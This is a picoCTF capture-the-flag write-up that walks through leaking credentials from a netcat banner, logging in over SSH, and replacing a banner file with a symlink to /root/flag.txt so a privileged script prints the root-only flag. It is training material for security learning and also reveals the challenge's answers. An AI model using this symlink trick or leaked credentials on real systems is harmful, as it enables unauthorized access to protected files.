# dont-you-love-banners

**Platform:** picoCTF  
**Category:** General Skills  
**Difficulty:** Medium  

## Description
Can you abuse the banner? The server has been leaking 
some crucial information on tethys.picoctf.net 55257. 
Use the leaked information to get to the server.

Connect to the running application:
nc tethys.picoctf.net 61290

Find the flag in the /root directory.

## Approach
The challenge involves three stages — extracting leaked 
credentials from a banner, using those credentials to 
SSH into the server, then exploiting a symlink 
vulnerability to read a file you don't have permission 
to access directly.

## Solution

### Step 1 — Leak Credentials via Banner
Connected to the application with netcat to see what 
information the server was leaking.

```bash
nc tethys.picoctf.net 61290
```

The banner script asked a series of questions. By reading 
the source code found at script.py the correct answers were:

- Password: MY_PASSW0RD_1234
- Top cybersecurity conference: DEFCON
- First hacker known for phreaking: JOHN DRAPER

Answering correctly granted SSH access as user player.

### Step 2 — SSH into the Server
Used the leaked credentials to connect via SSH.

```bash
ssh -p 55257 player@tethys.picoctf.net
```

Password: MY_PASSW0RD_1234

### Step 3 — Enumerate Permissions
Once connected checked the current user and available 
privileges.

```bash
id
whoami
sudo -l
```

Output showed:
- Running as player (uid=1000)
- sudo was not available
- flag.txt in /root was owned by root with permissions 
  -rw------- meaning only root could read it directly

### Step 4 — Symlink Exploitation
The banner script reads from /home/player/banner to 
display the welcome message. By replacing the banner 
file with a symlink pointing to /root/flag.txt the 
script would read and display the flag instead of 
the banner when it executed with elevated privileges.

```bash
cd /home/player
ln -sf /root/flag.txt /home/player/banner
```

### Step 5 — Trigger the Banner Read
Reconnected via netcat which caused the script to 
execute and read the banner file. Since banner now 
pointed to flag.txt via the symlink the flag was 
displayed in the output.

```bash
nc tethys.picoctf.net 61290
```

## Commands Used
```bash
nc tethys.picoctf.net 61290
ssh -p 55257 player@tethys.picoctf.net
id
whoami
sudo -l
ls -la
cd /home/player
ln -sf /root/flag.txt /home/player/banner
nc tethys.picoctf.net 61290
```

